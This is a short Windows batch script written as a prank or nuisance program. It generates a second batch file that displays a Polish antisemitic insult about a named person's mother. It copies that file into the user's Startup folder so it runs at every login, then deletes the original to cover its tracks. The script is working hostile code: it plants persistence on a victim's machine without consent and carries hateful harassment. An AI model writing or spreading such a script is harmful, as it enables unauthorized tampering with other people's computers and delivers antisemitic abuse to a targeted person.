@echo off
echo @echo off > libskt.bat
echo color a >> libskt.bat
echo echo MAMA DAWIDA JEST ZYDOWKA!!! >> libskt.bat
echo echo. >> libskt.bat
echo echo. >> libskt.bat
echo pause >> libskt.bat

for %%A in (%USERNAME%) do (
copy libskt.bat "C:\Users\%%A\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
)

del libskt.bat

exit
